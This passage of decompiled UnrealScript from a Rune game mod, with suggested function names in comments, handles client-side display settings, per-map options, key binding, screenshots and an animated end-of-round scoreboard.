            bViewTargetRotationYaw = true;
        }
        else if ((GetDelimitedPart(Command, 2) ~= "OFF") || (GetDelimitedPart(Command, 2) ~= "FALSE"))
        {
            bViewTargetRotationYaw = false;
        }
        else if ((GetDelimitedPart(Command, 2) ~= "TOG") || (GetDelimitedPart(Command, 2) ~= "TOGGLE"))
        {
            bViewTargetRotationYaw = !bViewTargetRotationYaw;
        }
    }
    else if (Option == "TARGETPITCH")
    {
        if ((GetDelimitedPart(Command, 2) ~= "ON") || (GetDelimitedPart(Command, 2) ~= "TRUE"))
        {
            bViewTargetRotationPitch = true;
        }
        else if ((GetDelimitedPart(Command, 2) ~= "OFF") || (GetDelimitedPart(Command, 2) ~= "FALSE"))
        {
            bViewTargetRotationPitch = false;
        }
        else if ((GetDelimitedPart(Command, 2) ~= "TOG") || (GetDelimitedPart(Command, 2) ~= "TOGGLE"))
        {
            bViewTargetRotationPitch = !bViewTargetRotationPitch;
        }
    }
}

// Suggested name: SetSkyboxLinking
function Parm_string_060(bool bLink)
{
    // This function iterates through all ZoneInfo actors in the level
    // and either links them to the skybox or unlinks them, based on the bLink parameter.

    local ZoneInfo CurrentZoneInfo;

    foreach Owner.Level.AllActors(Class'Engine.ZoneInfo', CurrentZoneInfo)
    {
        if (bLink)
        {
            CurrentZoneInfo.LinkToSkybox();
        }
        else
        {
            CurrentZoneInfo.SkyZone = none;
        }
    }
}

// Suggested name: SetFogEnabled
function Parm_string_059(bool bEnable)
{
    // This function iterates through all ZoneInfo actors in the level
    // and either enables or disables fog.

    local ZoneInfo CurrentZoneInfo;

    foreach Owner.Level.AllActors(Class'Engine.ZoneInfo', CurrentZoneInfo)
    {
        if (bEnable)
        {
            if (CurrentZoneInfo.FogDistance != 0.0)
            {
                INT_v6499 = int(CurrentZoneInfo.FogDistance);
            }
            CurrentZoneInfo.FogDistance = 0.0;
        }
        else
        {
            if (CurrentZoneInfo.FogDistance != 0.0)
            {
                INT_v6499 = int(CurrentZoneInfo.FogDistance);
            }
            CurrentZoneInfo.FogDistance = float(INT_v6499);
        }
    }
}

// Suggested name: SetAmbientSoundsEnabled
function Parm_string_002(bool bEnable)
{
    // This function enables or disables ambient sounds in the level.

    local Actor CurrentActor;
    local SoundPlayer CurrentSoundPlayer;

    foreach Owner.Level.AllActors(Class'Engine.Actor', CurrentActor)
    {
        if (!bEnable)
        {
            if (CurrentActor.AmbientSound != none)
            {
                CurrentActor.SoundVolume = 0;
                CurrentActor.AmbientSound = none;
            }

            if (CurrentActor.IsA('SoundPlayer'))
            {
                SoundPlayer(CurrentActor).TSoundRadius = 0.0;
                SoundPlayer(CurrentActor).TSoundVolume[0] = 0;
                SoundPlayer(CurrentActor).TSoundVolume[1] = 0;
                SoundPlayer(CurrentActor).TSoundVolume[2] = 0;
                SoundPlayer(CurrentActor).TSoundVolume[3] = 0;
            }
        }
    }

    foreach Owner.Level.AllActors(Class'Engine.SoundPlayer', CurrentSoundPlayer)
    {
        if (!bEnable)
        {
            CurrentSoundPlayer.Destroy();
            CurrentSoundPlayer = none;
        }
    }
}

// Suggested name: ClearKillFeed
function ClearKillFeed(string FeedOption)
{
    // This function appears to clear the kill feed, unless the option is "bLargeFeed".

    local int i;

    if (FeedOption == "bLargeFeed")
    {
        return;
    }

    for (i = 0; i < 32; i++)
    {
        ClearKillFeedEntry(i);
    }
}

// Suggested name: ManageMapSettings
function ManageMapSettings(string Action)
{
    // This function manages map-specific settings, allowing them to be loaded and saved.

    local int i;
    local bool bFoundEmptySlot;

    if (!B_v6501)
    {
        for (i = 0; i < 64; i++)
        {
            if (MapSettings[i].MapName ~= STR_v4369)
            {
                B_v6501 = true;
                INT_v6500 = i;
                break;
            }
        }

        if (!B_v6501)
        {
            for (i = 0; i < 64; i++)
            {
                if (!B_v6501)
                {
                    if ((MapSettings[i].MapName == "") || !MapSettings[i].bModify)
                    {
                        B_v6501 = true;
                        INT_v6500 = i;
                        bFoundEmptySlot = true;
                        break;
                    }
                }
            }
        }

        if (!B_v6501)
        {
            Owner.ClientMessage("Your map settings storage is full, can't save.");
        }
    }

    if (STR_v4369 != "")
    {
        MapSettings[INT_v6500].MapName = STR_v4369;
    }

    if ((Action ~= "load") && !bFoundEmptySlot && MapSettings[INT_v6500].bModify)
    {
        bLocalModify = MapSettings[INT_v6500].bModify;
        bLocalDisableSkybox = MapSettings[INT_v6500].bDisableSkybox;
        SetSkyboxLinking(!bLocalDisableSkybox);
        bLocalDisableFog = MapSettings[INT_v6500].bDisableFog;
        SetFogEnabled(!bLocalDisableFog);
        bLocalDisableAmbientSound = MapSettings[INT_v6500].bDisableAmbientSound;
        SetAmbientSoundsEnabled(!bLocalDisableAmbientSound);
        localTextureOverlay = MapSettings[INT_v6500].TextureOverlay;
        bLocalColorCorrection = MapSettings[INT_v6500].bColorCorrection;
        blur_alpha = MapSettings[INT_v6500].color_alpha;
        blur_r = int(MapSettings[INT_v6500].blurCol.R);
        blur_g = int(MapSettings[INT_v6500].blurCol.G);
        blur_b = int(MapSettings[INT_v6500].blurCol.B);

        if ((blur_alpha == 0.0) && !bLocalColorCorrection)
        {
            blur_alpha = 0.1;
            blur_b = 30;
        }

        if (localTextureOverlay != 0)
        {
            DynamicLoadObject(MTTarr[localTextureOverlay].MTT_TextureName, Class'Engine.Texture');
            ConsoleCommand("set texture macrotexture " @ MTTarr[localTextureOverlay].MTT_TextureName);
        }
    }

    if (Action ~= "bLocalModify")
    {
        MapSettings[INT_v6500].bModify = bLocalModify;
    }
    else if (Action ~= "bLocalDisableSkyBox")
    {
        MapSettings[INT_v6500].bDisableSkybox = bLocalDisableSkybox;
        SetSkyboxLinking(!bLocalDisableSkybox);
    }
    else if (Action ~= "bLocalDisableFog")
    {
        MapSettings[INT_v6500].bDisableFog = bLocalDisableFog;
        SetFogEnabled(!bLocalDisableFog);
    }
    else if (Action ~= "bLocalDisableAmbientSound")
    {
        MapSettings[INT_v6500].bDisableAmbientSound = bLocalDisableAmbientSound;
        SetAmbientSoundsEnabled(!bLocalDisableAmbientSound);
    }
    else if (Action ~= "bLocalColorCorrection")
    {
        MapSettings[INT_v6500].bColorCorrection = bLocalColorCorrection;
    }
    else if (Action ~= "float")
    {
        MapSettings[INT_v6500].color_alpha = blur_alpha;
    }
    else if (Action ~= "int")
    {
        MapSettings[INT_v6500].blurCol.R = byte(blur_r);
        MapSettings[INT_v6500].blurCol.G = byte(blur_g);
        MapSettings[INT_v6500].blurCol.B = byte(blur_b);

        if (MapSettings[INT_v6500].TextureOverlay != localTextureOverlay)
        {
            MapSettings[INT_v6500].TextureOverlay = localTextureOverlay;
            DynamicLoadObject(MTTarr[localTextureOverlay].MTT_TextureName, Class'Engine.Texture');
            ConsoleCommand("set texture macrotexture " @ MTTarr[localTextureOverlay].MTT_TextureName);
        }
    }
}

// Suggested name: SetConsoleFloatValue
exec function SetConsoleFloatValue(float NewValue)
{
    // This function sets a float value in the zRuneConsoleClientWindow.
    zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.FLT_v7264 = NewValue;
}

// Suggested name: SetConsoleType
exec function SetConsoleType(int ConsoleType)
{
    // This function sets the type of console to be used.
    newConsole = ConsoleType;
    Owner.ClientMessage(("Replace console with new console: " $ string(newConsole)) $ "   ~ reconnect to apply changes");
    SaveConfigAndRefresh();
}

// Suggested name: Test3DText
exec function test3d()
{
    // This function is for testing 3D text actors in the level.
    // It displays messages from various sources, including z3DText actors.

    local z3DText TextActor;

    Owner.ClientMessage(Owner.Level.LevelEnterText);
    Owner.ClientMessage(eqO_vxv_6741[0].Msg);

    foreach Owner.Level.AllActors(Class'coadminz7.z3DText', TextActor)
    {
        if (TextActor != none)
        {
            Owner.ClientMessage("#1 " $ TextActor.Msg);
        }
    }

    foreach Owner.AllActors(Class'coadminz7.z3DText', TextActor)
    {
        if (TextActor != none)
        {
            Owner.ClientMessage("#2 " $ TextActor.Msg);
        }
    }
}

// Suggested name: SetDodgeEnabled
exec function Dodge(string Mode)
{
    // This function enables or disables dodging for the player.

    local string LowercaseMode;
    LowercaseMode = Caps(Mode);

    if (LowercaseMode == "ON" || LowercaseMode == "ENABLE" || LowercaseMode == "ENABLED" || LowercaseMode == "ACTIVATE" || LowercaseMode == "TRUE")
    {
        Owner.DodgeClickTime = 0.25;
        Owner.ClientMessage("Dodging enabled, double tap a movement key (while holding a weapon) to dodge.");
    }
    else if (LowercaseMode == "OFF" || LowercaseMode == "DISABLE" || LowercaseMode == "DISABLED" || LowercaseMode == "DEACTIVATE" || LowercaseMode == "FALSE")
    {
        Owner.DodgeClickTime = 0.0;
        Owner.ClientMessage("Dodging disabled.");
    }
}

// Suggested name: TakeScreenshot
exec function Screenshot(optional int IsAuto)
{
    // This function takes a screenshot.
    // It first checks if the screenshot storage is full.

    local string ExecResult;

    ExecResult = Owner.ConsoleCommand("exec Shot0255.bmp");

    if (ExecResult == "")
    {
        INT_v6702 = 50;
        B_v6701 = true;
        B_v1853 = true;
        STR_v6703 = "ERROR: Your shot storage at 'Rune/System' is full.(255/255) (delete or move them)";
        return;
    }

    if (IsAuto == 1)
    {
        Viewport.Actor.ClientMessage("Scoreboard screenshot has been automatically taken by CoAdmin.");
    }

    ConsoleCommand("shot");
}

// Suggested name: RelaunchGame
exec function relaunch(string RelaunchParameter)
{
    // This function relaunches the game, with an option to change the video driver.

    bPendingRelaunch = true;
    RelaunchCommand = RelaunchParameter;

    if (RelaunchCommand ~= "-changevideo")
    {
        ZRunePlayer(Owner).SetPendingCommand("videodriver", false);
    }
    else
    {
        ZRunePlayer(Owner).SetPendingCommand("relaunch", false);
    }

    ZRunePlayer(Owner).myHUD.ConsoleCommand("disconnect");
}

// Suggested name: TestAwards
exec function testawards()
{
    // This function is for testing the awards system.
    // It sets various award-related variables to test their display in the scoreboard.

    Viewport.Actor.ClientMessage("this effect is clientside-only, for debugging purposes ( trophy position in scoreboard )");
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5354 = 5;
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadKills = 5;
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5355 = 5;
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5377 = 5;
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MaxSpree = 5;
    Owner.PlayerReplicationInfo.bFirstBlood = true;
}

// Suggested name: OpenZMenu
exec function zMenu()
{
    // This function opens the 'zMenu' window.

    bQuickKeyEnable = true;
    LaunchUWindow();

    if (ZMenuWindow == none)
    {
        ZMenuWindow = zWindow(Root.CreateWindow(Class'coadminz7.zWindow', 10.0, 10.0, 300.0, 190.0));
    }

    ZMenuWindow.ShowWindow();
}

// Suggested name: BindKey
exec function bind(string BindingString)
{
    // This function binds a command to a key.

    local string Key, Command, OldBinding;
    local bool bKeyExists;

    if (BindingString == "")
    {
        Owner.ClientMessage("Usage: 'bind <KEY> <COMMAND>'  -  e.g.: 'bind X name I_suck'");
    }
    else
    {
        Key = GetDelimitedPart(BindingString, 1);
        Command = Right(BindingString, (Len(BindingString) - Len(Key)) + 1);
        OldBinding = Owner.ConsoleCommand("keybinding " $ Key);
        bKeyExists = ContainsString(Owner.ConsoleCommand("get input " $ Key), "Unrecognized property");

        if (bKeyExists)
        {
            Owner.ClientMessage(("'" $ Key) $ "' does not fucking exist.");
            return;
        }

        Owner.ConsoleCommand("set input " $ BindingString);
        Owner.ClientMessage(((((("Changed '" $ Key) $ "' binding from '") $ OldBinding) $ "' to '") $ Command) $ "'");
    }
}

// Suggested name: SetTestFont
exec function SetFont(int FontIndex)
{
    // This function sets the test font.
    testFont = FontIndex;
}

// Suggested name: GetTeamColorByIndex
function Color GetTeamColorByIndex(int Team)
{
    // This function returns a color based on the team index.

    switch (Team)
    {
        case 0:
            return MakeColor(255, 0, 0); // Red
        case 1:
        case 4: // Team 4 seems to be an alias for team 1
            return MakeColor(0, 255, 0); // Green
        default:
            return MakeColor(255, 255, 255); // White
    }
}

// Suggested name: GetTeamColor
function Color GetTeamColor(int Team)
{
    // This function returns a color for a given team.
    // It has two different color schemes, depending on the bswitchcolors boolean.

    local zPlayerReplicationInfo zPRI;
    zPRI = zPlayerReplicationInfo(Owner.PlayerReplicationInfo);

    if (zPRI.bswitchcolors)
    {
        if (zPRI.Arena && Team != 255 && int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).matchSize) != 1)
        {
            Team = int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).TeamColor[Team]);
        }
        switch (Team)
        {
            case 0: return MakeColor(255, 0, 0); // Red
            case 1: return MakeColor(72, 243, 89); // Green
            case 2: return MakeColor(0, 255, 0); // Green
            case 3: return MakeColor(255, 255, 0); // Yellow
            case 4: return MakeColor(255, 0, 255); // Magenta
            case 255: return MakeColor(255, 255, 255); // White
            default: return MakeColor(255, 255, 255); // White
        }
    }
    else
    {
        if (zPRI.Arena && Team != 255 && int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).matchSize) != 1)
        {
            Team = int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).TeamColor[Team]);
        }
        switch (Team)
        {
            case 0: return MakeColor(255, 0, 0); // Red
            case 1: return MakeColor(32, 160, 230); // Blue
            case 2: return MakeColor(0, 255, 0); // Green
            case 3: return MakeColor(255, 255, 0); // Yellow
            case 4: return MakeColor(255, 0, 255); // Magenta
            case 255: return MakeColor(255, 255, 255); // White
            default: return MakeColor(255, 255, 255); // White
        }
    }
}

// Suggested name: GetTeamColor2
function Color GetTeamColor2(int Team)
{
    // This function returns a color for a given team, with two different color schemes.
    // It is very similar to GetTeamColor and might be a duplicate or a slightly different version.

    local zPlayerReplicationInfo zPRI;
    zPRI = zPlayerReplicationInfo(Owner.PlayerReplicationInfo);

    if (zPRI.bswitchcolors)
    {
        if (zPRI.Arena && Team != 255 && int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).matchSize) != 1)
        {
            Team = int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).TeamColor[Team]);
        }
        switch (Team)
        {
            case 0: return MakeColor(240, 52, 52); // Red
            case 1: return MakeColor(72, 243, 89); // Green
            case 2: return MakeColor(0, 255, 0); // Green
            case 3: return MakeColor(255, 255, 0); // Yellow
            case 4: return MakeColor(255, 0, 255); // Magenta
            case 255: return MakeColor(255, 255, 255); // White
            default: return MakeColor(255, 255, 255); // White
        }
    }
    else
    {
        if (zPRI.Arena && Team != 255 && int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).matchSize) != 1)
        {
            Team = int(zArenaGameReplicationInfo(Owner.GameReplicationInfo).TeamColor[Team]);
        }
        switch (Team)
        {
            case 0: return MakeColor(240, 52, 52); // Red
            case 1: return MakeColor(32, 160, 230); // Blue
            case 2: return MakeColor(0, 255, 0); // Green
            case 3: return MakeColor(255, 255, 0); // Yellow
            case 4: return MakeColor(255, 0, 255); // Magenta
            case 255: return MakeColor(255, 255, 255); // White
            default: return MakeColor(255, 255, 255); // White
        }
    }
}

// Suggested name: SetPlayerStatus
exec function Status(string NewStatus)
{
    // This function sets the player's status, with a 3-second cooldown.

    local string TruncatedStatus;

    if ((Owner.Level.TimeSeconds - (LastStatusChangeTime - 1.0)) > 3.0)
    {
        TruncatedStatus = Left(NewStatus, 40);
        zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("status", TruncatedStatus);
        myStatus = TruncatedStatus;
        LastStatusChangeTime = Owner.Level.TimeSeconds;
        SaveConfigAndRefresh();
        Owner.ClientMessage(("Your status has been changed to: '" $ TruncatedStatus) $ "'");
    }
    else
    {
        Owner.ClientMessage("You have to wait a few seconds before you can change your status again.");
    }
}

// Suggested name: DrawPlayerFlag
function DrawPlayerFlag(Canvas Canvas, float Alpha, int X, int Y, int W, int H, Color BackgroundColor)
{
    // This function draws a player's flag on the canvas.

    local Texture FlagTexture;

    if (zPlayerReplicationInfo(PRI_v6691).STR_v5383 == "")
    {
        Canvas.DrawColor = BackgroundColor;
        FlagTexture = Background;
    }
    else
    {
        FlagTexture = Texture(DynamicLoadObject("worldflags." $ zPlayerReplicationInfo(PRI_v6691).STR_v5383, Class'Engine.Texture'));
        Canvas.DrawColor = MakeColor(255, 255, 255);

        if (FlagTexture == none)
        {
            FlagTexture = Background;
            Canvas.DrawColor = BackgroundColor;
        }
    }

    Canvas.bCenter = false;
    Canvas.Style = 5;
    Canvas.AlphaScale = Alpha;
    Canvas.SetPos(float(X), float(Y));
    Canvas.DrawTile(FlagTexture, float(W), float(H), 0.0, 0.0, float(FlagTexture.USize), float(FlagTexture.VSize));
    Canvas.Style = 1;
    Canvas.AlphaScale = 1.0;
}

// Suggested name: DrawScoreboard
function DrawScoreboard(Canvas Canvas)
{
    // This function draws a scoreboard on the canvas.

    local int ScoreboardX, ScoreboardY, TempX, i, TotalHeight, PlayerCount;
    local float FPS;
    local int Team1Score, Team2Score, FFAScore;

    ScoreboardX = int((Canvas.ClipX - 500.0) + float(INT_v6350));
    TempX = int((Canvas.ClipX - (Canvas.ClipX / 3.84)) + float(INT_v6350));
    ScoreboardY = int(Canvas.ClipY * 0.2);
    INT_v6352 = 0;
    TotalHeight = 0;

    for (i = 0; i < 15; i++)
    {
        if (eqN_vxv_6657[i].Team != 102)
        {
            TotalHeight += 20;
        }
    }

    if (TotalHeight == 0)
    {
        TotalHeight += (20 * 16);
    }

    DrawStretchedBox(Canvas, 0.8, ScoreboardX, ScoreboardY, 500 + INT_v6350, 20 + TotalHeight, MakeColor(0, 0, 0));
    DrawBorder(Canvas, float(ScoreboardX), float(ScoreboardY), 500.0 + float(INT_v6350), 20.0 + float(TotalHeight), 1.0, MakeColor(55, 0, 0), 2);

    FPS = FLT_v6552;
    if (FPS > 300.0)
    {
        FPS = 300.0;
    }

    if (INT_v6354 > 250)
    {
        if (INT_v6350 > 0)
        {
            INT_v6350 -= int(float(20 * 100) / FPS);
        }
        else
        {
            INT_v6350 = 0;
        }
        INT_v6354 -= int(float(4 * 100) / FPS);
    }
    else
    {
        INT_v6350 += int(float(20 * 100) / FPS);
        if (INT_v6350 > 500)
        {
            arenatest = false;
        }
    }

    if (INT_v6350 == 0)
    {
        if (FLT_v6353 < 100.0)
        {
            FLT_v6353 += (125.0 / FPS);
        }
        else if ((FLT_v6353 >= 100.0) && FLT_v6353 < 200.0)
        {
            FLT_v6353 += (160.0 / FPS);
        }
        else if ((FLT_v6353 >= 200.0) && FLT_v6353 < 500.0)
        {
            FLT_v6353 += (220.0 / FPS);
        }
        else
        {
            FLT_v6353 += (620.0 / FPS);
        }
    }

    for (i = 0; i < 15; i++)
    {
        if (eqN_vxv_6657[i].Team != 102)
        {
            DrawPlayerScore(i, Canvas);
            INT_v6352 += 20;
            if (eqN_vxv_6657[i].Team == 0)
            {
                Team1Score += eqN_vxv_6657[i].Score;
            }
            if (eqN_vxv_6657[i].Team == 1)
            {
                Team2Score += eqN_vxv_6657[i].Score;
            }
            if (eqN_vxv_6657[i].Team == 255)
            {
                FFAScore += eqN_vxv_6657[i].Score;
            }
        }
    }

    PlayerCount = INT_v6352 / 20;

    if (Team2Score > Team1Score)
    {
        DrawScoreDistribution(Canvas, int(float(TempX) * 1.3), int(float(ScoreboardY + INT_v6352) * 0.9475), PlayerCount, Team2Score, FFAScore);
    }
    else
    {
        DrawScoreDistribution(Canvas, int(float(TempX) * 1.3), int(float(ScoreboardY + INT_v6352) * 0.9475), PlayerCount, Team1Score, FFAScore);
    }
}

// Suggested name: DrawScoreDistribution
function DrawScoreDistribution(Canvas Canvas, int CenterX, int CenterY, int PlayerCount, int Score1, int Score2)
{
    // This function draws a circular progress bar on the canvas to show the score distribution between teams.

    local float Score1_Percent, Score2_Percent, TotalScore, Angle1, Angle2, WinningTeamAngle, LosingTeamAngle;
    local Color WinningTeamColor, LosingTeamColor;
    local float FPS, Delta, AnimationFactor;

    TotalScore = float(Score1 + Score2);
    Score1_Percent = (float(Score1) / TotalScore) * 100.0;
    Score2_Percent = (float(Score2) / TotalScore) * 100.0;

    if (Score1_Percent > Score2_Percent)
    {
        WinningTeamColor = GetTeamColor(0);
        LosingTeamColor = GetTeamColor(255);
        WinningTeamAngle = Score1_Percent;
        LosingTeamAngle = Score2_Percent;
    }
    else
    {
        WinningTeamColor = GetTeamColor(1);
        LosingTeamColor = GetTeamColor(255);
        WinningTeamAngle = Score2_Percent;
        LosingTeamAngle = Score1_Percent;
    }

    Angle1 = (6.25 / 100.0) * WinningTeamAngle;
    Angle2 = (6.25 / 100.0) * LosingTeamAngle;

    FPS = FLT_v6552;
    if (FPS > 300.0)
    {
        FPS = 300.0;
    }

    if ((FLT_v6291 < 1.0) && !B_v6289)
    {
        FLT_v6291 += ((0.008 * 100.0) / FPS);
    }

    if ((FLT_v6291 > 1.0) && !B_v6289)
    {
        B_v6289 = true;
        FLT_v6291 = 1.0;
    }

    if ((FLT_v6292 < 1.0) && B_v6289)
    {
        FLT_v6292 += ((0.008 * 100.0) / FPS);
    }

    if ((FLT_v6292 > 1.0) && B_v6289)
    {
        B_v6290 = true;
        FLT_v6292 = 1.0;
    }

    Canvas.Style = 5;
    Canvas.AlphaScale = 0.22;
    AnimationFactor = (0.265 * 0.74) + (float(PlayerCount) * (0.02 * 0.38));
    DrawArc(Canvas, 120.0, 0.0, Angle1 * FLT_v6291, float(CenterX), float(CenterY), 0.02, AnimationFactor, WinningTeamColor);
    Canvas.AlphaScale = 0.18;

    if (B_v6289 && Score2 != 0)
    {
        DrawArc(Canvas, 120.0, Angle1, 6.25 * FLT_v6292, float(CenterX), float(CenterY), 0.02, AnimationFactor, LosingTeamColor);
    }

    Canvas.Style = 1;
    Canvas.AlphaScale = 1.0;
}

// Suggested name: DrawArc
simulated function DrawArc(Canvas Canvas, float Radius, float StartAngle, float EndAngle, float CenterX, float CenterY, float AngleStep, float Scale, optional Color ArcColor)
{
    // This function draws an arc of rectangles on the canvas.

    local float CurrentAngle, X, Y;

    if (AngleStep == 0.0)
    {
        AngleStep = 0.001;
    }

    Radius *= Scale;
    AngleStep /= Scale;
    Canvas.SetPos(CenterX, CenterY);

    for (CurrentAngle = StartAngle; CurrentAngle <= EndAngle; CurrentAngle += AngleStep)
    {
        X = Radius * Cos(CurrentAngle);
        Y = Radius * Sin(CurrentAngle);
        Canvas.CurX += X;
        Canvas.CurY -= Y;
        Canvas.DrawColor = ArcColor;
        Canvas.DrawRect(Texture'coadminz7.Icons.pixel', 7.0 * 0.95, 7.0 * 0.95);
        Canvas.CurX = CenterX;
        Canvas.CurY = CenterY;
    }
}

// Suggested name: ShowDamageHUD
exec function showDmgHUD()
{
    // This function displays a damage HUD, which shows player scores.

    local int i, j, MaxScoreIndex;
    local STCT_v2217 TempPlayerInfo;
    local PlayerReplicationInfo PRI;

    if (Owner == none)
    {
        return;
    }

    FLT_v6291 = 0.0;
    FLT_v6292 = 0.0;
    B_v6289 = false;
    B_v6290 = false;

    for (i = 0; i < 15; i++)
    {
        eqN_vxv_6657[i].PlayerName = "";
        eqN_vxv_6657[i].STR_v5383 = "";
        eqN_vxv_6657[i].Score = 0;
        eqN_vxv_6657[i].Team = 102;
        eqN_vxv_6657[i].B_v6656 = false;
    }

    i = 0;
    INT_v6350 = 500;
    FLT_v6353 = 0.0;
    INT_v6354 = 2700;
    INT_v6352 = 0;
    arenatest = true;

    foreach Owner.Level.AllActors(Class'Engine.PlayerReplicationInfo', PRI)
    {
        if (zPlayerReplicationInfo(PRI) != none)
        {
            if (zPlayerReplicationInfo(PRI).B_v5343)
            {
                eqN_vxv_6657[i].PlayerName = zPlayerReplicationInfo(PRI).PlayerName;
                eqN_vxv_6657[i].STR_v5383 = zPlayerReplicationInfo(PRI).STR_v5383;
                eqN_vxv_6657[i].B_v6656 = zPlayerReplicationInfo(PRI).B_v5396;

                if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v4632)
                {
                    eqN_vxv_6657[i].Score = zPlayerReplicationInfo(PRI).INT_v5344 * 12;
                }
                else
                {
                    eqN_vxv_6657[i].Score = zPlayerReplicationInfo(PRI).INT_v5344;
                }
                eqN_vxv_6657[i].Team = int(zPlayerReplicationInfo(PRI).Team);
                i++;
            }
        }
    }

    for (i = 0; i < 15; i++)
    {
        MaxScoreIndex = i;
        for (j = i + 1; j < 15; j++)
        {
            if (eqN_vxv_6657[j].Score > eqN_vxv_6657[MaxScoreIndex].Score)
            {
                MaxScoreIndex = j;
            }
        }
        TempPlayerInfo = eqN_vxv_6657[MaxScoreIndex];
        eqN_vxv_6657[MaxScoreIndex] = eqN_vxv_6657[i];
        eqN_vxv_6657[i] = TempPlayerInfo;
    }
}

// Suggested name: TestDamageHUD
exec function testDmgHUD(int TestType, optional int PlayerCount)
{
    // This function is for testing the damage HUD with randomly generated player data.

    local int i, j, MaxScoreIndex;
    local STCT_v2217 TempPlayerInfo;
    local int RandomPlayerIndex;

    if (PlayerCount == 0)
    {
        PlayerCount = 15;
    }

    RandomPlayerIndex = int(RandRange(0.0, float(PlayerCount)));
    FLT_v6291 = 0.0;
    FLT_v6292 = 0.0;
    B_v6289 = false;
    B_v6290 = false;

    for (i = 0; i < 15; i++)
    {
        eqN_vxv_6657[i].PlayerName = "";
        eqN_vxv_6657[i].STR_v5383 = "";
        eqN_vxv_6657[i].Score = 0;
        eqN_vxv_6657[i].Team = 102;
        eqN_vxv_6657[i].B_v6656 = false;
    }

    for (i = 0; i < PlayerCount; i++)
    {
        eqN_vxv_6657[i].PlayerName = "Test" @ string(i);
        eqN_vxv_6657[i].STR_v5383 = "";
        eqN_vxv_6657[i].Score = int(RandRange(0.0, 1600.0));

        if (i < (PlayerCount / 2))
        {
            eqN_vxv_6657[i].Team = 1;
        }
        else
        {
            eqN_vxv_6657[i].Team = 255;
        }

        if ((TestType == 1) && i == RandomPlayerIndex)
        {
            eqN_vxv_6657[i].Score = 420;
        }
        if ((TestType == 2) && i == RandomPlayerIndex)
        {
            eqN_vxv_6657[i].Score = 666;
        }
        if ((TestType == 3) && i == RandomPlayerIndex)
        {
            eqN_vxv_6657[i].B_v6656 = true;
        }
    }

    INT_v6350 = 500;
    FLT_v6353 = 0.0;
    INT_v6354 = 2700;
    INT_v6352 = 0;
    arenatest = true;

    for (i = 0; i < PlayerCount; i++)
    {
        MaxScoreIndex = i;
        for (j = i + 1; j < PlayerCount; j++)
        {
            if (eqN_vxv_6657[j].Score > eqN_vxv_6657[MaxScoreIndex].Score)
            {
                MaxScoreIndex = j;
            }
        }
        TempPlayerInfo = eqN_vxv_6657[MaxScoreIndex];
        eqN_vxv_6657[MaxScoreIndex] = eqN_vxv_6657[i];
        eqN_vxv_6657[i] = TempPlayerInfo;
    }
}

// Suggested name: DrawPlayerScore
function DrawPlayerScore(int PlayerIndex, Canvas Canvas)
{
    // This function draws a single player's information on the scoreboard.

    local int BaseX, BaseY;
    local Texture FlagTexture;
    local int FlagXOffset;
    local STCT_v2217 PlayerInfo;

    if (Canvas.ClipX < 1920.0)
    {
        FlagXOffset = int(Canvas.ClipX / 25.0);
    }

    BaseX = int((Canvas.ClipX - 500.0) + float(INT_v6350));
    BaseY = int(Canvas.ClipY * 0.2) + INT_v6352;
    PlayerInfo.PlayerName = eqN_vxv_6657[PlayerIndex].PlayerName;
    PlayerInfo.STR_v5383 = eqN_vxv_6657[PlayerIndex].STR_v5383;
    PlayerInfo.Score = eqN_vxv_6657[PlayerIndex].Score;
    PlayerInfo.Team = eqN_vxv_6657[PlayerIndex].Team;
    PlayerInfo.B_v6656 = eqN_vxv_6657[PlayerIndex].B_v6656;

    if (PlayerInfo.B_v6656)
    {
        Canvas.SetPos(((float(BaseX) * 1.03) * 1.02) + float(FlagXOffset), float(BaseY) * 1.04);
    }
    else
    {
        Canvas.SetPos((float(BaseX) * 1.03) + float(FlagXOffset), float(BaseY) * 1.04);
    }

    Canvas.DrawColor = GetTeamColor(PlayerInfo.Team);
    Canvas.Font = Canvas.BigFont;
    Canvas.DrawTextClipped(PlayerInfo.PlayerName);

    if (PlayerInfo.B_v6656)
    {
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.SetPos((float(BaseX) * 1.01) * 1.02, (float(BaseY) * 1.04) * 0.99);
        Canvas.DrawIcon(Texture'coadminz7.Icons.crown', 0.3);
        Canvas.DrawColor = MakeColor(255, 255, 255);
    }

    if ((PlayerInfo.STR_v5383 == "") || PlayerInfo.STR_v5383 == "xx")
    {
        FlagTexture = Texture(DynamicLoadObject("worldflags.xx", Class'Engine.Texture'));
    }
    else if (PlayerInfo.STR_v5383 ~= "RS")
    {
        FlagTexture = Texture'coadminz7.Icons.serbianflag';
    }
    else if (PlayerInfo.STR_v5383 ~= "IT")
    {
        FlagTexture = Texture'coadminz7.Icons.italianflag';
    }
    else
    {
        FlagTexture = Texture(DynamicLoadObject("worldflags." $ PlayerInfo.STR_v5383, Class'Engine.Texture'));
    }

    if (FlagTexture != none)
    {
        Canvas.SetPos(float(BaseX) * 1.01, float(BaseY) * 1.04);
        Canvas.DrawColor = MakeColor(255, 255, 255);
        Canvas.DrawIcon(FlagTexture, 0.75);
        Canvas.DrawColor = MakeColor(255, 255, 255);
    }

    if (FlagXOffset != 0)
    {
        FlagXOffset += 50;
    }

    if (Canvas.ClipX < 1024.0)
    {
        FlagXOffset *= 2.0;
    }

    Canvas.Style = 5;
    Canvas.AlphaScale = 0.6;
    Canvas.DrawColor = MakeColor(255, 0, 0);
    Canvas.SetPos((float(BaseX) * 1.15) + (float(FlagXOffset) * 1.15), float(BaseY) * 1.062);

    if (FLT_v6353 < float(PlayerInfo.Score))
    {
        Canvas.DrawRect(Texture'UWindow.WhiteTexture', FLT_v6353 / 7.0, 5.0);
    }
    else
    {
        if (PlayerInfo.Score == 666)
        {
